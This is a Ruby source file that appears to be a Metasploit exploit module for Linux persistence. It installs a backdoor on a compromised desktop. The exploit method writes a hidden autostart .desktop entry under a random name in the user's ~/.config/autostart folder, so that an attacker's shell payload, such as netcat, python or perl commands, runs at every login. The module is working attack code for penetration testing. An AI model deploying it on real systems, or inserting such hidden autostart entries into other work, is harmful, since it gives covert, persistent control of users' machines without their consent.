##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::Local::Persistence
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/linux/local/autostart_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Autostart Desktop Item Persistence',
        'Description' => %q{
          This module will create an autostart entry to execute a payload.
          The payload will be executed when the users logs in.

          Verified on Ubuntu 22.04 desktop with Gnome
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Eliott Teissonniere' ],
        'Platform' => [ 'unix', 'linux' ],
        'Arch' => ARCH_CMD,
        'Payload' => {
          'BadChars' => '#%\n"',
          'Compat' => {
            'PayloadType' => 'cmd',
            'RequiredCmd' => 'generic python netcat perl'
          }
        },
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'DisclosureDate' => '2006-02-13', # Date of the 0.5 doc for autostart
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'References' => [
          ['URL', 'https://attack.mitre.org/techniques/T1547/013/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options([ OptString.new('BACKDOOR_NAME', [false, 'Name of autostart entry' ]) ])
    deregister_options('WritableDir')
  end

  def check
    # https://unix.stackexchange.com/a/237750
    unless command_exists?('Xorg')
      return CheckCode::Safe('Xorg is not installed, likely a server install. Autostart requires a graphical environment')
    end

    CheckCode::Detected('Xorg is installed, possible desktop install.')
  end

  def exploit
    name = datastore['BACKDOOR_NAME'] || Rex::Text.rand_text_alpha(5..8)

    home = cmd_exec('echo ~')

    path = "#{home}/.config/autostart/#{name}.desktop"

    print_status('Making sure the autostart directory exists')
    cmd_exec("mkdir -p #{home}/.config/autostart") # in case no autostart exists

    print_status("Uploading autostart file #{path}")

    write_file(path, [
      '[Desktop Entry]',
      'Type=Application',
      "Name=#{name}",
      'NoDisplay=true',
      'Terminal=false',
      "Exec=/bin/sh -c \"#{payload.encoded}\""
    ].join("\n"))

    print_good("Backdoor will run on next login by #{whoami}")
  end
end
